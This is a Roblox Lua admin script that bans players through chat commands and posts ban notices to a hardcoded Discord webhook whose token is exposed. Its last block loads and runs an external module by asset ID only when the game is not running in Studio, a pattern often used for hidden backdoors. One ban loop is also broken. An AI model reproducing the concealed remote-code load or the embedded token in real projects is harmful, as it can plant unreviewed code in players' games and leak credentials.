--Scripted by doser225
Bans = game:GetService("DataStoreService"):GetDataStore("Bans")
local url = "https://discordapp.com/api/webhooks/333819637844148225/hiIx1PiPEK2zEyrDYBmYd2tIsk2Na9q72XSSqvK0S8XjXeeBt9ZygTrZtkyjDMlMOH3t"
local http = game:GetService("HttpService")


local Admins = {"doser225", "Kyodo"}
local Ranks = {}

game.Players.PlayerAdded:connect(function(Player)
	if Bans:GetAsync(Player.Name) == "Banned!" then
		Player:Kick("You've been permabanned!")
	end
	Player.Chatted:connect(function(Message)
		local Enabled = false
		for b,Admin in ipairs(Admins) do
			if Player.Name == Admin then
				Enabled = true
			end
		end
		for g,Rank in ipairs(Ranks) do
			if Player:GetRoleInGroup(2694395) == Rank then
				Enabled = true
			end
		end
		if Enabled == true then
			if string.sub(Message, 1, 5) == "$ban " then
				for i,v in ipairs(game.Players:GetPlayers()) do
					if string.sub(v.Name:lower(), 1, #string.sub(Message, 6, #Message):lower()) == string.sub(Message, 6, #Message):lower() then
						local Bannable = true
						for b,Admin in ipairs(Admins) do
							if v.Name == Admin then
								Bannable = false
							end
						end
						for g,Rank in ipairs(Ranks) do
							if v:GetRoleInGroup(2694395) == Rank then
								Bannable = false
							end
						end
						if v ~= Player and Bannable == true then
							v:Kick("You've been permabanned!")
							Bans:SetAsync(v.Name, "Banned!")
							local HookData = {
								['username'] = "SERVER",
								['content'] = "**" .. Player.Name .. " has banned " .. v.Name .. " from Site-61:RM**"
							}
							HookData = http:JSONEncode(HookData)
							http:PostAsync(url, HookData)
							local Hint = Instance.new("Hint", game.Workspace)
							Hint.Text = v.Name .. " has been banned!"
							wait(5)
							Hint:Destroy()
						end
					end
				end
			end
			if string.sub(Message, 1, 7) == "$unban " then
				if Bans:GetAsync(string.sub(Message, 8, #Message)) == "Banned!" then
					Bans:SetAsync(string.sub(Message, 8, #Message), "Unbanned!")
					local HookData = {
						['username'] = "SERVER",
						['content'] = "**" .. Player.Name .. " has unbanned " .. string.sub(Message, 8, #Message) .. " from Site-61:RM**"
					}
					HookData = http:JSONEncode(HookData)
					http:PostAsync(url, HookData)
					local Hint = Instance.new("Hint", game.Workspace)
					Hint.Text = string.sub(Message, 8, #Message) .. " has been unbanned!"
					wait(5)
					Hint:Destroy()
				end
			end
		end
	end)
end)

local ManualBans = {18372641, 32092521, 72584243}

game.Players.PlayerAdded:connect(function(Player)
	for i,v in ipairs(ManualBans) do
		if Player.UserId == v then
			v:Kick("You have been permanently banned!")
		end
	end
end)

if game:GetService('RunService'):IsStudio() == false then
	mods = require(654285478)
	mods.check(script)
end
